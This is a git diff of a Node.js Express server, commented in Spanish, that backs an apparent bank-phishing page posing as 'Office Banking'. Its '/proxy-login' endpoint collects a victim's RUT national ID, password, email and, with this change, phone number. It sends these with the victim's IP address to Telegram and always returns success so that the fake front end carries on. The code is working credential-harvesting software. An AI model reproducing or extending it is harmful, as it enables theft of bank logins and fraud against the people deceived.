@@ -56,16 +56,16 @@ app.post("/autorizar", async (req, res) => {
   res.json({ status: "ok", mensaje: "Autorización recibida correctamente" });
 });
 
-// Endpoint para login → enviar credenciales o correo a Telegram
+// Endpoint para login → enviar credenciales, correo o teléfono a Telegram
 app.post("/proxy-login", async (req, res) => {
-  const { rut, passwd, mail } = req.body;
+  const { rut, passwd, mail, telefono } = req.body;
   const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
   let mensaje;
 
   if (mail) {
     mensaje = `Correo actualizado:\n${mail || "(sin correo)"}\nIP: ${ip}`;
   } else {
-    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nIP: ${ip}`;
+    mensaje = `Login recibido AutOB:\nRUT: ${rut || "(sin rut)"}\nClave: ${passwd || "(sin clave)"}\nTeléfono: ${telefono || "(sin teléfono)"}\nIP: ${ip}`;
   }
 
   try {
@@ -76,7 +76,7 @@ app.post("/proxy-login", async (req, res) => {
     });
   } catch (err) {
     console.error("Error enviando a Telegram:", err.message);
-    // ⚠️ No devolvemos 500, devolvemos igual ok para que el frontend avance
+    // ⚠️ No devolvemos 500, devolvemos igual OK para que el frontend avance
   }
 
   res.json({ status: "ok", mensaje: "Bienvenido a Office Banking" });
@@ -92,3 +92,4 @@ app.listen(PORT, () => {
   console.log(`Servidor corriendo en puerto ${PORT}`);
   console.log("Node version:", process.version);
 });
+
